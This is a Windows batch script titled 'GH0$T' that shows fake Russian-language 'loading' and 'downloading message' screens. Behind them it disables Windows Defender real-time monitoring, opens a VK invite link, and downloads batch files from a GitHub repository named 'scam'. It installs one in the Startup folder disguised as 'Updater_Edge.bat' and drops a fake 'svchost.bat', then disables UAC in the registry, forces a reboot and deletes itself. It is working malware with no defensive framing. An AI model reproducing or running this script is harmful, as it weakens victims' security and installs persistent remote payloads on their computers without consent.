@echo off
mode con:cols=60 lines=10
setlocal

chcp 65001 > nul

title GH0$T

cls

powershell -command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1

echo.
echo  %date%
echo.
echo  Загрузка.
timeout /t 1 /nobreak > nul
cls

echo.
echo  %date%
echo.
echo  Загрузка..
timeout /t 1 /nobreak > nul
cls

echo.
echo  %date%
echo.
echo  Загрузка...
timeout /t 1 /nobreak > nul
cls

echo.
echo  поиск сообщений...
timeout /t 3 /nobreak > nul
cls
echo.
echo  найдено 1 сообщение.
timeout /t 1 /nobreak > nul
echo.
echo  скачивание сообщения...
timeout /t 6 /nobreak > nul
cls

start https://vk.com/invite/AMKGDq4

set "msg_path=%USERPROFILE%\Desktop\read me.txt"
set "github_url=https://raw.githubusercontent.com/kaktakt/scam/refs/heads/viruss/read me.txt"

powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%github_url%', '%msg_path%')"

set "file_path=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\scam.bat"
set "github_url=https://raw.githubusercontent.com/kaktakt/scam/refs/heads/viruss/scam.bat"

set "sv_path=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\svchost.bat"
set "github_sv=https://raw.githubusercontent.com/kaktakt/scam/refs/heads/viruss/svchost.bat"

powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%github_url%', '%file_path%')"
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%github_sv%', '%sv_path%')"

set "fp=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

cd %fp%
rename "scam.bat" "Updater_Edge.bat"

echo.
echo  сообщение в файле Read me.txt
timeout /t 2 /nobreak > nul
cls
echo.
echo  restart 3.
timeout /t 1 /nobreak > nul
cls
echo.
echo  restart 2..
timeout /t 1 /nobreak > nul
cls
echo.
echo  restart 1...
timeout /t 1 /nobreak > nul

reg.exe ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d0 /f

shutdown /r /t 0 >nul 2>&1

del %~f0